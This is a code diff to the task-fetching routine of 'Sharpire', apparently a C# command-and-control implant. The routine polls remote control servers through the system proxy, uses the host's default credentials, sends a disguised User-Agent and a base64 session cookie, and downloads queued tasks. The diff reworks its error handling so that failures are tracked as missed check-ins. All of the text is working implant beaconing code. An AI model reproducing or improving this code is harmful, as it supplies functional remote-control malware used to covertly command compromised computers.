@@ -261,33 +261,60 @@ namespace Sharpire
 
         internal byte[] GetTask()
         {
-            byte[] results = new byte[0];
+            byte[] results = null;
             try
             {
                 byte[] routingPacket = NewRoutingPacket(null, 4);
                 string routingCookie = Convert.ToBase64String(routingPacket);
 
-                using (WebClient webClient = new WebClient())
+                WebClient webClient = new WebClient();
+                webClient.Proxy = WebRequest.GetSystemWebProxy();
+                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
+                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
+                webClient.Headers.Add("Cookie", "session=" + routingCookie);
+
+                Random random = new Random();
+                string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
+
+                results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
+            }
+            catch (WebException webException)
+            {
+                // Check if we got an HTTP response
+                if (webException.Response != null)
                 {
+                    HttpWebResponse response = (HttpWebResponse)webException.Response;
 
-                    webClient.Proxy = WebRequest.GetSystemWebProxy();
-                    webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
-                    webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
-                    webClient.Headers.Add("Cookie", "session=" + routingCookie);
-
-                    Random random = new Random();
-                    string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
-                    results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
+                    if (response.StatusCode == HttpStatusCode.NotFound)
+                    {
+                        // 404 = no tasks available, this is normal, don't increment missed checkins
+                        Console.WriteLine("Received 404 - No tasks available");
+                        return null;
+                    }
+                    else
+                    {
+                        // Other HTTP errors (500, 401, etc.) - server responded but with error
+                        Console.WriteLine($"HTTP Error: {(int)response.StatusCode} - {response.StatusCode}");
+                        MissedCheckins++;
+                        return null;
+                    }
+                }
+                else
+                {
+                    // No response = server unreachable (network error, timeout, DNS failure, etc.)
+                    Console.WriteLine($"Server unreachable: {webException.Message}");
+                    MissedCheckins++;
+                    return null;
                 }
             }
-            catch (WebException)
+            catch (Exception ex)
             {
+                // Unexpected errors - treat as missed checkin
+                Console.WriteLine($"Unexpected error in GetTask: {ex.Message}");
                 MissedCheckins++;
-                // if ((int)((HttpWebResponse)webException.Response).StatusCode == 401)
-                // {
-                //     //Restart everything
-                // }
+                return null;
             }
+
             return results;
         }
 
